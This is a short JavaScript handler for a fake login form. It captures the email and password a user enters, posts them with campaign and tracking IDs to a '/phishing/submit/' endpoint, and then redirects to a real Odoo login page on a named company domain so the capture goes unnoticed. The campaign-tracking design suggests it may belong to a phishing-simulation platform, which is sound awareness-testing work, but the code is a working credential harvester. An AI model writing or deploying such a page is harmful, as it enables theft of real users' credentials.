document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    // 🟢 EXTRACT FROM URL: matches ?cid=XX&tid=YY
    const urlParams = new URLSearchParams(window.location.search);
    const campaignId = urlParams.get('cid'); 
    const trackingId = urlParams.get('tid');
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Prevents sending 'null' which causes the 422 error
    if (!campaignId) {
        console.error("❌ Error: Missing Campaign ID in URL.");
        return;
    }

    try {
        const response = await fetch(`/phishing/submit/${campaignId}?tid=${trackingId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });

        if (response.ok) {
            // Redirect to real Odoo login after capture
            window.location.href = "https://odoo.relishtechglobal.com/en/web/login";
        }
    } catch (err) {
        console.error("Transmission failed.", err);
    }
});
